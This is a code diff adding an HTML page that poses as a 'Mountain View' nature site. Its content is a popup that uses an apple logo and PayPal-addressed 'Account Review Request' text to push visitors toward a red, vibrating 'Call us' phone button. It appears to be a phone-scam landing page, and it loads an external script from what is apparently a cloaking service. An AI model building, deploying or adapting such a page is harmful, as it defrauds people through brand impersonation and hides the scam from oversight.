@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mountain View - Welcome</title>
+    <meta name="description" content="A beautiful mountain view website with an interactive popup.">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://app.zerocloak.com/secure.js/oc8rjqji2p"></script>
+</head>
+
+<body>
+    <div class="background-container"></div>
+
+    <main class="main-content">
+        <h1 class="title">Explore Peaks</h1>
+        <p class="subtitle">Discover the beauty of nature</p>
+    </main>
+
+    <!-- Overlay and Popup -->
+    <div id="overlay" class="overlay"></div>
+    <div id="welcome-popup" class="popup glassmorphism">
+        <div class="popup-content">
+            <img src="assets/apple.png" alt="Red Apple"
+                style="width: 80px; height: auto; margin: 0 auto 1rem auto; display: block; border-radius: 50%; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">
+            <h2 class="popup-title">Account Review Request</h2>
+            <div class="popup-text"
+                style="text-align: left; font-size: 0.95rem; line-height: 1.5; height: 300px; overflow-y: auto; padding-right: 10px;">
+                <p style="margin-bottom: 1rem;">Dear PayPal team.</p>
+                <p style="margin-bottom: 1rem;">I please request you to have a manual review of this account. Few days
+                    ago we had a talk with one of your support team member escalating this issue to support team but i
+                    have received no reply since.</p>
+                <p style="margin-bottom: 1rem;"><strong>The email we received it states a line: <em>(Based on the information we
+                        have today, there was information used to create this account that we cannot verify)</em>.</strong></p>
+                <p><strong>I would Request papal team to have a manual review of my account and the information. I am confident
+                    about this it’s an error. I would be Thankfull.</strong></p>
+            </div>
+            <div class="action-buttons" style="margin-top: 1.5rem; gap: 0.5rem;">
+                <a href="tel:+12052771332" class="btn btn-primary vibrate-btn"
+                    style="display: block; text-decoration: none; background-color: #ff4444; color: white; border: none;">Call us on +1 205 277 1332</a>
+                <button id="cancel-btn" class="btn btn-secondary" style="display: block; width: 100%;">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
